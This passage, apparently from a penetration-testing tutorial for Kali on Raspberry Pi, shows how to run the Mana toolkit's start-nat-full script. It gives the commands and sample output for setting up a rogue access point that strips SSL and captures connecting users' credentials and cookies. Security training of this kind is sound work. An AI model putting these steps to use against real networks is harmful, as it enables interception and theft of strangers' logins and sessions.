  md: '***Important Directories:***


    **Mana program**: /usr/share/mana-toolkit


    **Mana configuration settings**: /etc/mana-toolkit/hostapd-mana.conf


    **Mana startup scripts**: /usr/share/mana-toolkit/run-mana


    **Mana captured traffic & logs**: /var/lib/mana-toolkit


    ***Running Mana***


    In a Kali Pi terminal, enter the following:


    > *cd /usr/share/mana-toolkit


    cd run-mana*


    In this directory you will find several scripts that you can run:


    ```

    root@kali-pi:/usr/share/mana-toolkit/run-mana# ls

    firelamb-view.sh    start-noupstream-all.sh    start-noupstream.sh

    start-nat-full.sh   start-noupstream-eap.sh

    start-nat-simple.sh start-noupstream-eaponly.sh

    ```


    See the Mana documentation for a complete description of what each script does.
    Like we did in the previous Mana chapter, we will run the **start-nat-full script**.
    This script creates a Wi-Fi Access Point, performs SSL strip (attempting to downgrade
    HTTPS to HTTP) and a man-in-the-middle attack on any clients that connect to it.
    It then captures any credentials and cookies and stores them in the log folder.


    To start the tool:


    > *./start-nat-full.sh*


    ```

    root@kali-pi:/usr/share/mana-toolkit/run-mana# ./start-nat-full.sh

    hostname WRT54G

    Current MAC:   XXXXXXXXXX   (TP-LINK TECHNOLOGIES CO., LTD.)

    Permanent MAC: XXXXXXXXXX   (TP-LINK TECHNOLOGIES CO., LTD.)

    New MAC:       06:0b:a2:91:b8:77  (unknown)

    Configuration file: /etc/mana-toolkit/hostapd-mana.conf

    Using interface wlan0 with hwaddr 00:11:22:33:44:00 and ssid "Internet"

    wlan0: interface state UNINITIALIZED->ENABLED

    wlan0: AP-ENABLED

    ```'
